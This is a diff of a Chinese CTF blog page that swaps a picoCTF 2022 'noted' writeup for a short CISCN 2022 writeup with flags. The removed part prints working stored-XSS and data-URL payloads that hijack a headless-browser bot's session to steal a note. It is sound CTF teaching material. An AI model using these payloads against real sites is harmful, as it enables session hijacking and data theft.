@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>picoCTF-2022-复盘 | hututu&#39;blog</title>
+  <title>CISCNCTF2022 初赛 WP | hututu&#39;blog</title>
   <meta name="keywords" content=" ctf ">
-  <meta name="description" content="picoCTF-2022-复盘 | hututu&#39;blog">
+  <meta name="description" content="CISCNCTF2022 初赛 WP | hututu&#39;blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="CRYPTO签到电台按公众号提示 密文+密码本 模10 得到密码 1732 2514 1344 0356 0451 6671 0055 1116 8739 2160 4882 4331 7393 0019 2848 0243 3404 4138 4782 3964 0064 开启会话 http:&#x2F;&#x2F;eci-2zeh1c14i16ne6hcxxxb.cloudeci1.ichunqiu.com:88">
 <meta property="og:type" content="article">
@@ -320,9 +320,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-picoCTF-2022-复盘" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-CISCNCTF2022-初赛-WP" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">picoCTF-2022-复盘</h1>
+        <h1 class="article-title">CISCNCTF2022 初赛 WP</h1>
     
     <div class="article-meta">
         
@@ -332,7 +332,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="CTF-复现">CTF-复现</a>
+            <a  data-rel="CTF-Writeup">CTF-Writeup</a>
             
         </span>
         
@@ -347,7 +347,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2022-05-02 00:59:28'>2022-04-05 20:58</time>
+            Created At : <time class="date" title='Updated At: 2022-06-28 01:59:51'>2022-06-01 01:56</time>
         
     </div>
     <div class="article-meta">
@@ -380,7 +380,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#noted"><span class="toc-text">noted</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CRYPTO"><span class="toc-text">CRYPTO</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0%E7%94%B5%E5%8F%B0"><span class="toc-text">签到电台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E6%8C%91%E6%88%98%E7%A0%81%E7%9A%84%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%813"><span class="toc-text">基于挑战码的双向认证3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop"><span class="toc-text">ezpop</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -396,33 +396,24 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="noted"><a href="#noted" class="headerlink" title="noted"></a>noted</h3><p>​        题目给的是一个备忘录网站，创建用户后即可创建备忘录条目，同时还实现了一个bot，即用户提交网站后会被服务器端用chrome打开并访问。可以注意到，每一次在<code>/repot</code>提交url时，服务器都会先随机注册一个账号然后提交flag到备忘录，随后再访问用户提交的url。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> page = (<span class="keyword">await</span> browser.<span class="title function_">pages</span>())[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://0.0.0.0:8080/register&#x27;</span>);</span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;[name=&quot;username&quot;]&#x27;</span>, crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;[name=&quot;password&quot;]&#x27;</span>, crypto.<span class="title function_">randomBytes</span>(<span class="number">8</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>([</span><br><span class="line">    page.<span class="title function_">click</span>(<span class="string">&#x27;[type=&quot;submit&quot;]&#x27;</span>),</span><br><span class="line">    page.<span class="title function_">waitForNavigation</span>(&#123; <span class="attr">waituntil</span>: <span class="string">&#x27;domcontentloaded&#x27;</span> &#125;)</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;http://0.0.0.0:8080/new&#x27;</span>);</span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;[name=&quot;title&quot;]&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">type</span>(<span class="string">&#x27;[name=&quot;content&quot;]&#x27;</span>, process.<span class="property">env</span>.<span class="property">FLAG</span> ?? <span class="string">&#x27;ctf&#123;flag&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>([</span><br><span class="line">    page.<span class="title function_">click</span>(<span class="string">&#x27;[type=&quot;submit&quot;]&#x27;</span>),</span><br><span class="line">    page.<span class="title function_">waitForNavigation</span>(&#123; <span class="attr">waituntil</span>: <span class="string">&#x27;domcontentloaded&#x27;</span> &#125;)</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">goto</span>(<span class="string">&#x27;about:blank&#x27;</span>)</span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">goto</span>(url);</span><br><span class="line"><span class="keyword">await</span> page.<span class="title function_">waitForTimeout</span>(<span class="number">7500</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br></pre></td></tr></table></figure>
+        <h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="签到电台"><a href="#签到电台" class="headerlink" title="签到电台"></a>签到电台</h2><p>按公众号提示</p>
+<p>密文+密码本 模10 得到密码</p>
+<p>1732 2514 1344 0356 0451 6671 0055</p>
+<p>1116 8739 2160 4882 4331 7393 0019</p>
+<p>2848 0243 3404 4138 4782 3964 0064</p>
+<p>开启会话</p>
+<p><a target="_blank" rel="noopener" href="http://eci-2zeh1c14i16ne6hcxxxb.cloudeci1.ichunqiu.com:8888/send?msg=s">http://eci-2zeh1c14i16ne6hcxxxb.cloudeci1.ichunqiu.com:8888/send?msg=s</a></p>
+<p>发送电报</p>
+<p><a target="_blank" rel="noopener" href="http://eci-2zeh1c14i16ne6hcxxxb.cloudeci1.ichunqiu.com:8888/send?msg=2848024334044138478239640064">http://eci-2zeh1c14i16ne6hcxxxb.cloudeci1.ichunqiu.com:8888/send?msg=2848024334044138478239640064</a></p>
+<p>flag{50c75dee-dc65-4dc1-83c1-6d220643e513}</p>
+<h2 id="基于挑战码的双向认证3"><a href="#基于挑战码的双向认证3" class="headerlink" title="基于挑战码的双向认证3"></a>基于挑战码的双向认证3</h2><p>ssh连接，su提权，密码toor</p>
+<img src="/2022/06/01/CISCNCTF2022-%E5%88%9D%E8%B5%9B-WP/image1.jpg" class="" title="This is an image">
 
-<p>这里的bot是基于puppeteer实现的，页面访问使用的是<code>page.goto</code>，<code>page.goto(url[, options])</code>这个方法不仅可以直接类似于http://这类链接，而且还可以使用伪协议，类似于page.goto(data:text/html,自定义内容)，那么我们就可以在这里动手，直接让服务器把flag发送到我们自己的vps是。但是，答案是否定的，因为服务器端的账户并不能访问外网，这个方法是行不通的。</p>
-<p>​        我们继续看一下views文件夹下的.ejs模板文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">	&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">	&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">	&lt;title&gt;noted | my notes&lt;/title&gt;</span><br><span class="line">	&lt;%- include(&#x27;style&#x27;) %&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;My Notes&lt;/h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;% for (let note of notes) &#123; %&gt;</span><br><span class="line">&lt;div&gt;</span><br><span class="line">	&lt;h2&gt;&lt;%- note.title %&gt;&lt;/h2&gt;</span><br><span class="line">	&lt;p&gt;&lt;%- note.content %&gt;&lt;/p&gt;</span><br><span class="line">	&lt;form action=&quot;/delete&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;_csrf&quot; value=&quot;&lt;%- csrf %&gt;&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&lt;%- note.id %&gt;&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot; value=&quot;Delete&quot;&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;a href=&#x27;/new&#x27;&gt;New Note&lt;/a&gt; | &lt;a href=&#x27;/report&#x27;&gt;Report&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>flag{7b352ef0-1bb1-41af-a7d7-b74f62ff23f0}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>参考 ：<a target="_blank" rel="noopener" href="https://www.icode9.com/content-1-1367188.html">https://www.icode9.com/content-1-1367188.html</a></p>
+<img src="/2022/06/01/CISCNCTF2022-%E5%88%9D%E8%B5%9B-WP/image2.jpg" class="" title="This is an image">
 
-<p>模板中note.title和note.content都是直接填充，也就是说这里是存在存储型xss的。所以就可以让服务器登录我们已知密码的账号，然后将flag提交到已知密码账号的备忘录中，随后我们登录该账号即可获取到flag。攻击流程如下图：</p>
-<img src="/2022/04/05/picoCTF-2022-%E5%A4%8D%E7%9B%98/gjlc.png" class="" title="This is an image">
-
-
-
-<img src="/2022/04/05/picoCTF-2022-%E5%A4%8D%E7%9B%98/ck.png" class="" title="This is an image">
-
-
-
-<p>首先现在<code>/register</code>页面注册账户：账号为a密码为a，然后提交以下self-XSS内容到<code>/new</code>页面</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://0.0.0.0:8080/new&quot;</span> <span class="attr">id</span>=<span class="string">ifra</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> flag = <span class="variable language_">window</span>.<span class="property">opener</span>.<span class="property">document</span>.<span class="property">body</span>.<span class="property">textContent</span>;</span></span><br><span class="line"><span class="language-javascript">    ifra.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        ifra.<span class="property">onload</span> = <span class="literal">null</span>;</span></span><br><span class="line"><span class="language-javascript">        ifra.<span class="property">contentDocument</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="property">title</span>.<span class="property">value</span> = <span class="string">&#x27;flag&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        ifra.<span class="property">contentDocument</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="property">content</span>.<span class="property">value</span> = flag;</span></span><br><span class="line"><span class="language-javascript">        ifra.<span class="property">contentDocument</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>接着提交如下内容到<code>/report</code></p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data:text/html,</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    window.location = &quot;http://0.0.0.0:8080/notes&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    a = window.open(&#x27;&#x27;, &#x27;&#x27;);</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    a.document.body.innerHTML = `<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://0.0.0.0:8080/login&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">name</span>=<span class="string">xp</span> <span class="attr">id</span>=<span class="string">xp</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>`;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    a.document.xp.submit();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    a.location.href = &quot;http://0.0.0.0:8080/notes&quot;;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>提交后等待几秒后再次访问已知密码的账户的<code>/notes</code>页面即可获取到flag</p>
-<img src="/2022/04/05/picoCTF-2022-%E5%A4%8D%E7%9B%98/image-20220405211310235.png" class="" title="This is an image">
-
-
-
+<p>flag{0b9c9b72-0f36-464e-b4a4-bd1ea26e5e63}</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 hututu1024@126.com </span>
